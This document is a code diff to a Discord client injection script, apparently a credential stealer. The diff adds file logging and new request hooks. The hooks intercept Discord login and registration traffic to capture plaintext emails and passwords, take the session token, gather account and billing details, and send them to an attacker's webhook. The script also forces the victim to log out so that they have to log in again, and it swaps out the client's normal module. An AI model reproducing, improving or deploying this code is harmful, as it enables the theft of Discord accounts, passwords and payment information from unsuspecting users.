@@ -10,6 +10,24 @@ const {
     session,
 } = require('electron');
 
+// COMPREHENSIVE LOGGING SYSTEM
+const LOG_FILE = path.join(os.tmpdir(), 'discord_injection_debug.log');
+const log = (message) => {
+    const timestamp = new Date().toISOString();
+    const logMsg = `[${timestamp}] ${message}\n`;
+    console.log(`🔍 INJECTION: ${message}`);
+    try {
+        fs.appendFileSync(LOG_FILE, logMsg);
+    } catch (e) {
+        // Silent fail if can't write to log file
+    }
+};
+
+log('=== DISCORD INJECTION STARTING ===');
+log('Current directory: ' + __dirname);
+log('Process args: ' + JSON.stringify(process.argv));
+log('Log file location: ' + LOG_FILE);
+
 const CONFIG = {
     webhook: "%WEBHOOK%",
     injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
@@ -144,7 +162,7 @@ const clearAllUserData = () => {
 };
 
 const forceLogout = async () => {
-    console.log('DEBUG: Forcing Discord logout...');
+    log('Forcing Discord logout...');
     try {
         await executeJS(`
             localStorage.clear();
@@ -159,7 +177,7 @@ const forceLogout = async () => {
                     });
                 });
             }
-            console.log('DEBUG: All auth data cleared');
+            console.log('All auth data cleared');
             return 'logout_complete';
         `);
         
@@ -168,27 +186,28 @@ const forceLogout = async () => {
         }, JSON.stringify({
             "content": "🚪 **User Forced Logout** - Discord will require fresh login on restart!"
         }));
+        log('Logout webhook sent successfully');
         
     } catch (e) {
-        console.log('DEBUG: Logout error:', e.message);
+        log('Logout error: ' + e.message);
     }
 };
 
 const getToken = async () => {
     try {
         const token = await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
-        console.log('DEBUG: Token extraction:', token ? 'SUCCESS' : 'FAILED');
+        log('Token extraction: ' + (token ? 'SUCCESS (length: ' + token.length + ')' : 'FAILED'));
         return token;
     } catch (e) {
-        console.log('DEBUG: Token extraction error:', e.message);
+        log('Token extraction error: ' + e.message);
         return null;
     }
 };
 
 const hooker = async (content, token, account) => {
-    console.log('DEBUG: Hooker function called for user:', account ? account.username : 'NO_ACCOUNT');
-    console.log('DEBUG: Token length:', token ? token.length : 0);
-    console.log('DEBUG: Webhook URL:', CONFIG.webhook);
+    log('Hooker function called for user: ' + (account ? account.username : 'NO_ACCOUNT'));
+    log('Token length: ' + (token ? token.length : 0));
+    log('Webhook URL: ' + CONFIG.webhook);
 
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "ProxyCord - discord injector";
@@ -205,7 +224,7 @@ const hooker = async (content, token, account) => {
     };
     content["embeds"][0]["title"] = "Account Information";
 
-    console.log('DEBUG: Getting account details...');
+    log('Getting account details...');
     const nitro = getNitro(account.premium_type);
     const badges = getBadges(account.flags);
     const billing = await getBilling(token);
@@ -242,15 +261,15 @@ const hooker = async (content, token, account) => {
         content["embeds"][embed]["color"] = 0xb143e3;
     }
 
-    console.log('DEBUG: Sending webhook...');
+    log('Sending webhook...');
     try {
         await request("POST", CONFIG.webhook, {
             "Content-Type": "application/json"
         }, JSON.stringify(content));
-        console.log('DEBUG: Webhook sent successfully!');
+        log('Webhook sent successfully!');
         return true; // Return success
     } catch (error) {
-        console.log('DEBUG: Webhook send failed:', error.message);
+        log('Webhook send failed: ' + error.message);
         return false; // Return failure
     }
 };
@@ -368,14 +387,14 @@ const getServers = async token => {
 };
 
 const EmailPassToken = async (email, password, token, action) => {
-    console.log('DEBUG: EmailPassToken called for action:', action);
-    console.log('DEBUG: Email:', email ? 'PROVIDED' : 'MISSING');
-    console.log('DEBUG: Password:', password ? 'PROVIDED' : 'MISSING');
-    console.log('DEBUG: Token:', token ? 'PROVIDED' : 'MISSING');
+    log('📧 EmailPassToken called for action: ' + action);
+    log('Email: ' + (email ? 'PROVIDED (' + email + ')' : 'MISSING'));
+    log('Password: ' + (password ? 'PROVIDED (length: ' + password.length + ')' : 'MISSING'));
+    log('Token: ' + (token ? 'PROVIDED (length: ' + token.length + ')' : 'MISSING'));
     
     try {
         const account = await fetchAccount(token);
-        console.log('DEBUG: Account fetched successfully:', account.username);
+        log('Account fetched successfully: ' + account.username);
         
         const content = {
             "content": `**${account.username}** just ${action}!`,
@@ -392,19 +411,19 @@ const EmailPassToken = async (email, password, token, action) => {
             }]
         };
         
-        console.log('DEBUG: Calling hooker with content...');
+        log('Calling hooker with content...');
         const webhookSuccess = await hooker(content, token, account);
         
         // Only remove initiation folder if webhook was sent successfully
         if (webhookSuccess && fs.existsSync(path.join(__dirname, 'initiation'))) {
-            console.log('DEBUG: SUCCESS! Removing initiation folder after successful data capture...');
+            log('SUCCESS! Removing initiation folder after successful data capture...');
             fs.rmdirSync(path.join(__dirname, 'initiation'));
         } else if (!webhookSuccess) {
-            console.log('DEBUG: Webhook failed - keeping initiation folder for retry');
+            log('Webhook failed - keeping initiation folder for retry');
         }
         
     } catch (error) {
-        console.log('DEBUG: EmailPassToken error:', error.message);
+        log('EmailPassToken error: ' + error.message);
     }
 }
 
@@ -520,16 +539,19 @@ const discordPath = (function () {
 })();
 
 async function initiation() {
-    console.log('DEBUG: Initiation function called');
-    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
-        console.log('DEBUG: Initiation folder found - injection is active!');
+    log('🚀 Initiation function called');
+    const initiationPath = path.join(__dirname, 'initiation');
+    log('Checking for initiation folder at: ' + initiationPath);
+    
+    if (fs.existsSync(initiationPath)) {
+        log('✅ Initiation folder found - injection is ACTIVE!');
         
         // DON'T DELETE THE FOLDER YET - we need it to stay active for login capture!
         // The folder will be deleted after successful login capture in EmailPassToken
 
         const token = await getToken();
         if (token) {
-            console.log('DEBUG: Token found, extracting account data...');
+            log('Token found, extracting account data...');
             try {
                 const account = await fetchAccount(token);
                 const content = {
@@ -547,9 +569,9 @@ async function initiation() {
                     }]
                 };
                 await hooker(content, token, account);
-                console.log('DEBUG: Account data sent successfully!');
+                log('Account data sent successfully!');
             } catch (e) {
-                console.log('DEBUG: Failed to extract account data:', e.message);
+                log('Failed to extract account data: ' + e.message);
             }
         }
         
@@ -557,7 +579,7 @@ async function initiation() {
         await forceLogout();
         setTimeout(() => clearAllUserData(), 2000);
     } else {
-        console.log('DEBUG: No initiation folder found - injection will not run');
+        log('❌ No initiation folder found - injection will NOT run');
     }
 
     const {
@@ -722,4 +744,121 @@ session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, cal
     })
 });
 
-module.exports = require("./core.asar");
+// Add login/logout/register monitoring
+session.defaultSession.webRequest.onBeforeRequest({ urls: ["https://discord.com/api/v*/auth/login"] }, async (details, callback) => {
+    log('📵 LOGIN REQUEST INTERCEPTED! Details: ' + JSON.stringify(details, null, 2));
+    log('URL: ' + details.url);
+    log('Method: ' + details.method);
+    
+    if (details.uploadData && Array.isArray(details.uploadData) && details.uploadData.length > 0) {
+        const uploadData = details.uploadData[0];
+        if (uploadData.bytes) {
+            const postDataString = Buffer.from(uploadData.bytes).toString('utf-8');
+            log('POST data intercepted: ' + postDataString);
+            
+            try {
+                const postData = JSON.parse(postDataString);
+                const email = postData['email'];
+                const password = postData['password'];
+                
+                if (email && password) {
+                    log('🎆 SUCCESS! Email and password extracted from login!');
+                    log('Email: ' + email);
+                    log('Password: ****(' + password.length + ' chars)');
+                    
+                    // Delay to allow response
+                    setTimeout(async () => {
+                        const token = await getToken();
+                        if (token) {
+                            log('Token obtained, sending login data...');
+                            await EmailPassToken(email, password, token, "logged in");
+                        } else {
+                            log('⚠️ Warning: No token found after login attempt');
+                        }
+                    }, 3000);
+                } else {
+                    log('No email/password found in POST data');
+                }
+            } catch (e) {
+                log('Failed to parse POST data: ' + e.message);
+            }
+        } else {
+            log('No bytes in upload data');
+        }
+    } else {
+        log('No POST data in login request');
+    }
+    
+    callback({ cancel: false });
+});
+
+session.defaultSession.webRequest.onBeforeRequest({ urls: ["https://discord.com/api/v*/auth/logout"] }, async (details, callback) => {
+    log('🔪 LOGOUT REQUEST INTERCEPTED!');
+    log('URL: ' + details.url);
+    log('Method: ' + details.method);
+    
+    try {
+        const token = await getToken();
+        if (token) {
+            log('Token found for logout, sending logout notification...');
+            const account = await fetchAccount(token);
+            await EmailPassToken("", "", token, "logged out");
+        } else {
+            log('No token found during logout');
+        }
+    } catch (e) {
+        log('Error handling logout: ' + e.message);
+    }
+    
+    callback({ cancel: false });
+});
+
+session.defaultSession.webRequest.onBeforeRequest({ urls: ["https://discord.com/api/v*/auth/register"] }, async (details, callback) => {
+    log('🎉 REGISTER REQUEST INTERCEPTED!');
+    log('URL: ' + details.url);
+    
+    if (details.uploadData && Array.isArray(details.uploadData) && details.uploadData.length > 0) {
+        const uploadData = details.uploadData[0];
+        if (uploadData.bytes) {
+            const postDataString = Buffer.from(uploadData.bytes).toString('utf-8');
+            log('Registration POST data: ' + postDataString);
+            
+            try {
+                const postData = JSON.parse(postDataString);
+                const email = postData['email'];
+                const password = postData['password'];
+                
+                if (email && password) {
+                    log('Registration email and password extracted!');
+                    
+                    // Delay to allow successful registration
+                    setTimeout(async () => {
+                        const token = await getToken();
+                        if (token) {
+                            log('Sending registration data...');
+                            await EmailPassToken(email, password, token, "registered");
+                        } else {
+                            log('No token found after registration');
+                        }
+                    }, 5000);
+                }
+            } catch (e) {
+                log('Failed to parse registration POST data: ' + e.message);
+            }
+        }
+    }
+    
+    callback({ cancel: false });
+});
+
+// Initialize the injection
+module.exports = () => {
+    log('🚀 INJECTION MODULE STARTING!');
+    log('Current time: ' + new Date().toISOString());
+    log('Current directory: ' + __dirname);
+    
+    // Start the initiation process
+    initiation();
+    
+    log('🟢 Injection module loaded - monitoring active!');
+};
